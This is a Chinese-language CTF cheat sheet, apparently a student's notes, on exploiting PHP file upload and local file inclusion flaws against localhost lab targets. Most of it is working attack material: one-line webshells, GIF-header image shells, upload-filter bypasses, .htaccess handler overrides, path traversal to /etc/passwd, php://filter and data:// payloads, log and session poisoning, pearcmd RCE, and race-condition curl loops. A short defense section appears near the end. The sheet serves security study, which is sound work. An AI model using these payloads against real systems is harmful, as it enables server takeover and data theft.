> 用法：做题不记得了 → 翻到对应知识点 → 照着 payload 改
> 命令环境：**CMD**（curl.exe 双引号；个别 PowerShell 专属命令已标注 PS，含 CMD 替代）
> 验证标注：✓(YYYY-MM-DD)=当日靶场实弹；课程实弹=2026-08-20~27（up1~up8 / fi1~fi7 全通）；未标注 = 教材知识
> 靶场：基础 http://localhost:8085/（up1~up4 / fi1~fi4）｜ 进阶 http://localhost:8086/（up5~up8 / fi5~fi7）
> 2026-08-30 v2 对齐：头图例/双靶场端口/CMD 化 + 抽验 up1、up2、fi2、fi5、fi7 五链全通 + 坑清单新增 14~16 条（日志自污染/幽灵 inode/日志刷新延迟）

========================================================
## 0. 拿到题先走这个流程
========================================================

**上传题**：
```
1. 读源码：找 move_uploaded_file + 检查逻辑，判断检查的是哪一层：
   - 不检查 → 直接传 .php
   - 黑名单（拦 php 系）→ 大小写 / 漏网扩展名（.pht .php3…）
   - 白名单（只收 jpg/png/gif）→ 图片马（要配合包含点/解析漏洞）
   - MIME 检查（Content-Type）→ 伪造请求头
   - 内容检查（getimagesize）→ 文件头加魔术字节 GIF89a
2. 上传 webshell → 访问 /xx/uploads/shell.xxx?1=命令 → 拿 flag
3. 被拦 → 看拦截提示，查第 2 节绕过表
```

**包含题**：
```
1. 读源码：找 include/require + 参数是否用户可控
2. 看拼接方式：
   - 裸 include($p) → 路径穿越 / 伪协议随便用
   - include('pages/'.$p.'.php') → ../ 消前缀 + 文件名吸收后缀
3. 目标递进：读文件（LFI）→ 读源码（php://filter）→ RCE（data://，要 allow_url_include）
```

========================================================
## 1. webshell 弹药库（上传题带什么）
========================================================

```php
<?php system($_GET[1]); ?>
<?php echo file_get_contents('/flag.txt'); ?>
<?php eval($_POST[1]); ?>
```
- 第 1 条最常用：`?1=cat+/flag.txt` 直接执行命令
- 第 2 条：只读文件（无参数版）
- 第 3 条：一句话木马（蚁剑/菜刀连接用）

**图片马**（过 getimagesize / 文件头检查）：
```
GIF89a<?php system($_GET[1]); ?>
```
- 魔术字节：GIF=`GIF89a`；JPEG=`\xFF\xD8\xFF`；PNG=`\x89PNG`
- 原理：内容检查只看文件头几个字节，后面跟什么都行
- ⚠️ 图片马**自己不会执行**——必须配合「文件包含」或「解析漏洞」（见第 6 节）

========================================================
## 2. 上传检查绕过速查（拦什么换什么）
========================================================

| 检查方式 | 绕过 | 例子 |
|---------|------|------|
| 不检查 | 直接传 | shell.php |
| 黑名单（大小写敏感） | 大小写 | shell.PhP |
| 黑名单（列不全） | 漏网扩展名 | shell.pht（.php3/.php5 视服务端配置） |
| MIME 检查 | 伪造 Content-Type | curl -F "f=@shell.pht;type=image/jpeg" |
| 白名单 + 内容检查 | 图片马 | GIF89a+payload 存 .gif → 配合包含执行 |
| 前端 JS 检查 | 不走浏览器 | curl 直接发（JS 只在浏览器生效） |
| %00 截断 | ❌ PHP≥5.3.4 失效 | 只对老版本有效，现在别浪费时间 |

**黑名单 vs 白名单**：黑名单=拦已知坏的（永远列不全，总有漏网）；白名单=只放已知好的（更强，得绕内容检查或找解析漏洞）。**防御上白名单才是正解**——所以越难的题越是白名单。

========================================================
## 3. 上传的 curl 用法（不用浏览器）
========================================================

```
curl.exe -F "f=@shell.php" http://localhost:8085/up1/
curl.exe -F "f=@shell.pht;type=image/jpeg" http://localhost:8085/up3/
curl.exe "http://localhost:8085/up1/uploads/shell.php?1=cat%20/flag.txt"
```
（依次：普通上传 ✓ 实测 / 伪造 MIME / 触发 webshell——交互式单 %，写进 .bat 才双写 %%20）

- `-F` = multipart 表单上传；`;type=` 只改这一个文件的 Content-Type
- **上传（POST）和触发（GET 访问文件）是两步**——传完不等于拿到 shell
- ?1= 后面的空格要编码成 %20（或用 +）

========================================================
## 4. LFI 路径穿越（读任意文件）
========================================================

```url
?page=/etc/passwd                 -- 绝对路径（Linux 万能试金石）
?page=/flag_fi1.txt               -- 绝对路径读 flag
?page=../../../../../etc/passwd   -- 相对路径穿越
```

- include 非 PHP 文件 = **原样输出内容**（所以能当"读文件"用）
- include PHP 文件 = **当代码执行**（源码看不到，注释被解析掉）
- **../ 数法**：从 include 基准目录往上数一层一个；数错了看 warning 里的完整路径，照着调

========================================================
## 5. php://filter 读源码（看不到源码时用）
========================================================

```url
?page=php://filter/read=convert.base64-encode/resource=index.php
?page=php://filter/convert.base64-encode/resource=/var/www/html/fi3/index.php
```

- 拿到一串 base64 → 解码 → 完整源码（flag 常藏在注释里）
- **为什么需要它**：include 一个 .php 只会执行不显示；filter 把文件内容 base64 编码后输出——"读"而不"执行"
- ⚠️ 前后缀拼接时用不了（前缀把伪协议顶掉了）→ 先用 ../ 消前缀

========================================================
## 6. 伪协议 RCE（allow_url_include=On 时）
========================================================

```url
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTsgPz4=
?page=php://input    （POST 体里放 <?php system('cat /flag'); ?>）
```

- data:// 把 base64 解码后**当代码执行**——include 直接变 RCE
- php://input 把 POST 请求体**当代码执行**
- ⚠️ 都需要 php.ini 的 `allow_url_include=On`（**默认关闭**——真实环境大多关着，所以这是"配置错误型"漏洞，metasploit 打真实站少见到，CTF 常见）
- ⚠️ base64 里的 `+ / =` 在 URL 里要编码——`+` 是老朋友了（xs4 的坑）

========================================================
## 7. 前后缀拼接突围（include('pages/'.$p.'.php')）
========================================================

```
问题：前缀 pages/ 挡路，后缀 .php 甩不掉
解法：../ 消前缀 + 文件名吸收后缀
  ?page=../../../../../flag_fi2
  → include('pages/../../../../../flag_fi2.php')
  → 实际包含 /flag_fi2.php —— 后缀正好是文件名的一部分，被"吸收"了！
```

- 关键：目标文件名**以 .php 结尾**时，拼接的后缀就被吸收
- ../ 数错不要紧——warning 会把解析后的完整路径报给你（报错是导航）
- PHP ≥5.3.4 没有 %00 截断，别试

========================================================
## 8. 图片马 + 包含联动（白名单的克星，L3 思路）
========================================================

```
① 上传：GIF89a<?php system($_GET[1]); ?> 存成 horse.gif
   （白名单过：.gif 合法；内容检查过：GIF89a 是合法 GIF 头）
② 找执行点：页面有 include 用户可控文件的功能（查看器/模板/预览）
③ 触发：?img=horse.gif&1=cat+/flag.txt
   → include 把 GIF 当 PHP 解析 → GIF89a 当文本输出，后面的代码执行
```

- 上传和包含**单独出现都可能无害，组合起来就是 RCE**
- "两个中危凑成一个高危"的经典模式——真实 SRC 挖洞也常这样组合

========================================================
## 9. 读源码找漏洞点（PHP）
========================================================

| 漏洞代码 | 说明 |
|----------|------|
| move_uploaded_file(..., $dir.$_FILES['f']['name']) | 用原始文件名保存 = 扩展名可控 |
| in_array($ext, $blacklist)（没 strtolower） | 黑名单大小写敏感 → .PhP 绕过 |
| in_array($_FILES['f']['type'], $allow) | MIME=请求头=可伪造 |
| getimagesize() | 只看文件头 → GIF89a 图片马 |
| include($_GET['page']) | 任意包含（LFI/伪协议全通） |
| include('pages/'.$p.'.php') | 拼接包含 → ../ + 后缀吸收 |
| 上传目录在 web 根下且可执行 | 上传即 RCE |

## 10. 防御（面试）
========================================================

1. 上传：白名单 + 随机重命名 + 存储目录禁止执行 + 内容二次校验
2. 包含：不让用户控制 include 的任何部分；页面写死映射表
3. allow_url_include 永远关闭
4. 上传文件放独立域名/对象存储（大厂做法，天然隔离）

========================================================
## 11. 坑清单
========================================================

1. **上传（POST）和触发（GET）是两步**——传完不等于拿到 shell，要访问文件 URL
2. **URL 里 base64 的 + / = 要编码**（xs4 的 + 坑又来了）
3. **%00 截断只对 PHP < 5.3.4 有效**——现代环境别浪费时间
4. **图片马传上去不会自己执行**——必须有包含点/解析漏洞配合
5. **include .php 是执行不是显示**——想看源码用 php://filter
6. **MIME 检查的是请求头**——浏览器表单替你发，curl -F 可以随便伪造
7. **../ 数错就看 warning**——报错里有完整路径，照着调层数
8. **PowerShell 里 curl 传带双引号的 POST 体，引号会被吃**——payload 写进文件用 --data-binary @文件
9. **Windows 写 .htaccess 必须 LF 换行**——Set-Content/记事本默认 CRLF，\r 混进指令 → Apache 500；用 `[IO.File]::WriteAllText($p, $content, (New-Object System.Text.UTF8Encoding($false)))`
10. **Set-Content 可能写 UTF-8 BOM**——BOM 顶在 GIF89a 前 → getimagesize 判非图片；图片马一律用 WriteAllText 无 BOM 写
11. **PS 双引号会吞 $_**——`"u=<?php system($_GET[1]); ?>"` 里 $_ 被插值成空；payload 带 $_ 一律用**单引号**包
12. **curl 把 URL 里的 `[1]` 当通配范围拒发请求**——URL 含 `[]` 必须加 `-g`（关 globbing）
13. **pearcmd 的 argv 不做 URL 解码**——payload 必须裸传（不能 %3C 编码），配合 -g；PS 单引号 CMD 双引号
14. **日志包含的"毒行自污染"（2026-08-30 实证）**——日志里残留一条语法坏毒行(如 `$_` 被 shell 吃成 `&_`),include 时 PHP **编译期** parse error 炸掉整个文件,后面再好的毒行也轮不到执行;包含失败先 cat 日志本身查坏行
15. **rm 正在写的日志文件 = 幽灵 inode（2026-08-30 实证）**——Apache 的 fd 还开着,新请求全写进被删的 inode,路径永远不再出现;清日志用截断(`: > 文件`)别用 rm
16. **日志写入有缓冲延迟**——投毒后立刻包含可能读不到新行,隔一两秒重试

## 12. 进阶：双写绕过 / .htaccess / 解析漏洞（第 5b 课）
========================================================

**双写绕过（过滤是"删除"而非"拒绝"）**：
```
代码:str_replace('php', '', $name)   ← 只扫一遍
payload:shell.pphphp → 删掉中间的 php → 剩下 p+hp = php → 存成 shell.php
口诀:删一个,嵌两个——删掉的空位由剩下的字符重新拼回
```

**.htaccess 上传（黑名单漏了配置文件）**：
```
# .htaccess 内容(LF 换行!无 BOM!):
<FilesMatch "\.gif$">
SetHandler application/x-httpd-php
</FilesMatch>
# 写文件(避开 CRLF/BOM 两个坑)——【PS 专属】CMD 的 echo 只会写 CRLF 且难控编码,老实用下面这句:
[IO.File]::WriteAllText("D:\deepseek\ctf-lab\.htaccess", "<FilesMatch `"\.gif$`">`nSetHandler application/x-httpd-php`n</FilesMatch>`n", (New-Object System.Text.UTF8Encoding($false)))
```
- 原理:Apache 目录级配置文件,能让**整个目录**的 .gif 当 PHP 跑——抢到的是"解析规则制定权"
- 前提:服务器 AllowOverride All(否则传了也不生效)

**Apache 解析漏洞（AddHandler 从右往左找处理器）**：
```
服务器配置:AddHandler application/x-httpd-php .php
上传:shell.php.jpg(白名单看后缀是 .jpg → 放行;内容 GIF89a 过图片检查)
访问:Apache 从右往左扫扩展名:.jpg 没注册 → .php 注册了 → 当 PHP 执行!
```
- 三大解析漏洞家族:Apache(多扩展名)/ IIS 6.0(分号 xx.asp;.jpg)/ Nginx(路径修复 x.jpg/1.php)
- 教训:白名单再严,"能不能执行"最终由服务器配置说了算

## 13. 进阶：竞争条件（第 5b 课）
========================================================

```
漏洞代码:move_uploaded_file 先保存 → sleep 扫描 → unlink 删除
攻击:上传循环 + 访问循环双开,抢"文件存在的那 1 秒"
```
```
【PS 专属写法】
# 窗口 A(后台狂传):
Start-Job { 1..40 | % { curl.exe -s -F "f=@D:\deepseek\ctf-lab\shell.php" http://localhost:8086/up7/ | Out-Null } }
# 窗口 B(前台狂访问):
1..120 | % { curl.exe -s "http://localhost:8086/up7/uploads/shell.php?1=cat%20/flag_up7.txt" }

【CMD 替代】开两个 CMD 窗口(交互式单 %;写进 .bat 时 %i 和 %20 都要双写):
:: 窗口 A
for /l %i in (1,1,40) do @curl.exe -s -F "f=@shell.php" http://localhost:8086/up7/
:: 窗口 B
for /l %i in (1,1,120) do @curl.exe -s "http://localhost:8086/up7/uploads/shell.php?1=cat%20/flag_up7.txt"
```
- 判断依据:**响应说"已删除"≠文件从未存在**;源码里 save 在 check 前就有窗口
- 真实 SRC:头像裁剪、云盘秒传,都出过竞争洞

## 14. 进阶：日志包含 / Session 包含 / pearcmd（第 5b 课）
========================================================

**日志包含(伪协议被关时的 LFI→RCE 主路)**：
```
# ① 投毒(UA 写进日志;PS 用单引号防 $_ 插值,CMD 直接双引号):
curl.exe -A "<?php system($_GET[1]); ?>" "http://localhost:8086/fi5/?page=inc/home.php"   [CMD 形态,✓2026-08-30]
# ② 包含日志执行:
curl.exe "http://localhost:8086/fi5/?page=/var/log/visit.log&1=cat%20/flag_fi5.txt"
```
- 原理:日志是"内容你可控、本来就在服务器上"的文件;include 它=执行你写入的行
- 真实环境日志路径:/var/log/apache2/access.log、/var/log/nginx/access.log、/var/log/auth.log

**Session 包含**：
```
curl.exe -c jar.txt -G --data-urlencode "u=<?php system($_GET[1]); ?>" http://localhost:8086/fi6/   [CMD 形态]
# 从 jar.txt 里找 PHPSESSID,然后:
curl.exe -b D:\deepseek\ctf-lab\jar.txt "http://localhost:8086/fi6/?page=/tmp/sess_会话ID&1=cat%20/flag_fi6.txt"
```
- 原理:session 文件(/tmp/sess_ID)的内容跟着你的输入走——又一份"可控内容的服务器文件"

**pearcmd(LFI 冷门神器,2021 后 CTF 高频)**：
```
# ① 让 pearcmd 把代码嵌进生成的配置文件(-g 必须!URL 带 []):
curl.exe -sg "http://localhost:8086/fi7/?page=/usr/local/lib/php/pearcmd.php&+config-create+/<?=system($_GET[1])?>+/tmp/x.php"   [CMD 形态,✓2026-08-30]
# ② 包含生成的文件:
curl.exe "http://localhost:8086/fi7/?page=/tmp/x.php&1=cat%20/flag_fi7.txt"
```
- 原理:服务器自带 PEAR 工具(/usr/local/lib/php/pearcmd.php),register_argc_argv=On 时 URL 查询串=它的命令行参数;config-create 把 from 参数**原样嵌入**输出文件
- 要点:argv 不做 URL 解码(payload 裸传)、curl 要 -g、PS 要单引号——三坑合一
- 意义:伪协议全关、日志全锁时的最后一条 RCE 路

## 15. 进阶合体：拼接 + 日志 + 吸收（fi8 思路）
========================================================

```
处境:include('pages/'.$p.'.php') 前后焊死 + 伪协议全关 + 无上传点
素材:① 日志投毒(fi5) ② 日志文件偏偏叫 /var/log/fi8log.php(.php 结尾) ③ 后缀吸收(fi2)
合成:?page=../../../../../var/log/fi8log
     → include('pages/../../../../../var/log/fi8log.php')  ← 后缀被文件名吸收
     → 日志里你投的毒代码执行
```
- 三招都是学过的——新题=旧招的新组合;**LFI 高阶题的本质就是排列组合**

## 心法

> 先读源码看检查哪一层 ｜ 黑名单找漏网，白名单配组合拳 ｜ include 是读也是执行 ｜ 看不到源码就 php://filter ｜ 上传+包含 = RCE ｜ 伪协议被关就想"哪份服务器文件的内容我可控"（日志/session/临时文件）｜ 新题=旧招的新组合
